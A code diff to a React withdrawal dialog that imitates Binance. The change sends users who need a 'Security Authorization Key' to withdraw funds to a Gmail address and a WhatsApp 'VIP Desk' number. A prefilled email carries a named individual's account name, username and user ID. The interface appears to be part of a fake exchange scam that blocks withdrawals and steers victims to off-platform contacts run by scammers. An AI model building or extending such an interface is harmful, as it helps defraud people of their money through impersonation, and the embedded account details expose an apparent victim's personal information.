@@ -17,6 +17,7 @@ import {
   Check,
   ShieldAlert,
   ExternalLink,
+  Mail,
 } from 'lucide-react';
 
 export const WithdrawModal: React.FC = () => {
@@ -34,6 +35,13 @@ export const WithdrawModal: React.FC = () => {
   const [showSupportTicket, setShowSupportTicket] = useState(false);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const [successMessage, setSuccessMessage] = useState<string | null>(null);
+  const [copiedEmail, setCopiedEmail] = useState(false);
+
+  const handleCopyEmail = () => {
+    navigator.clipboard.writeText('Binancecareplus@gmail.com').catch(() => {});
+    setCopiedEmail(true);
+    setTimeout(() => setCopiedEmail(false), 2000);
+  };
 
   if (activeModal !== 'WITHDRAW') return null;
 
@@ -334,28 +342,39 @@ export const WithdrawModal: React.FC = () => {
                   </div>
 
                   <div className="bg-[#2B313A]/50 border border-[#FCD535]/30 p-3.5 rounded-xl flex items-start gap-2.5">
-                    <Headphones size={18} className="text-[#FCD535] shrink-0 mt-0.5" />
-                    <div className="flex flex-col gap-1">
+                    <Mail size={18} className="text-[#FCD535] shrink-0 mt-0.5" />
+                    <div className="flex flex-col gap-1 w-full">
                       <p className="text-xs text-[#EAECEF] leading-relaxed">
-                        To retrieve or reset your Security Authorization Key, please contact our 24/7 Live Support or WhatsApp VIP Desk.
+                        To retrieve or reset your Security Authorization Key, please contact our dedicated security support email:
                       </p>
-                      <span className="text-[10px] text-[#25D366] font-semibold">
+                      <div className="flex items-center justify-between bg-[#181A20] px-3 py-2 rounded-lg border border-[#2B313A] mt-1">
+                        <span className="font-mono text-xs text-[#FCD535] font-semibold select-all">
+                          Binancecareplus@gmail.com
+                        </span>
+                        <button
+                          type="button"
+                          onClick={handleCopyEmail}
+                          className="text-[10px] text-[#848E9C] hover:text-[#EAECEF] px-2 py-0.5 rounded bg-[#2B313A] flex items-center gap-1 transition-colors"
+                          title="Copy Email Address"
+                        >
+                          {copiedEmail ? <Check size={11} className="text-[#0ECB81]" /> : <Copy size={11} />}
+                          <span>{copiedEmail ? 'Copied' : 'Copy'}</span>
+                        </button>
+                      </div>
+                      <span className="text-[10px] text-[#25D366] font-semibold mt-1">
                         WhatsApp VIP Desk: +1 936 332 3841
                       </span>
                     </div>
                   </div>
 
                   <div className="flex flex-col gap-2 pt-2">
-                    <button
-                      onClick={() => {
-                        setShowForgotModal(false);
-                        setActiveModal('LIVE_CHAT');
-                      }}
+                    <a
+                      href="mailto:Binancecareplus@gmail.com?subject=Security%20Auth%20Key%20Reset%20Request&body=Hello%20Binance%20Support%2C%0A%0AI%20am%20requesting%20assistance%20to%20reset%20my%20Security%20Authorization%20Key%20for%20account%20withdrawal.%0A%0AAccount%20Name%3A%20Dianne%20Pizallo%0AUsername%3A%20DiannePizallo88%0AUser%20ID%3A%2089342019%0A%0AThank%20you."
                       className="w-full py-2.5 rounded-xl bg-[#FCD535] hover:bg-[#F0B90B] text-[#0E0E0E] font-bold text-xs transition-colors flex items-center justify-center gap-1.5"
                     >
-                      <Headphones size={14} />
-                      <span>Contact 24/7 Live Support</span>
-                    </button>
+                      <Mail size={14} />
+                      <span>Contact: Binancecareplus@gmail.com</span>
+                    </a>
 
                     <button
                       onClick={() => {
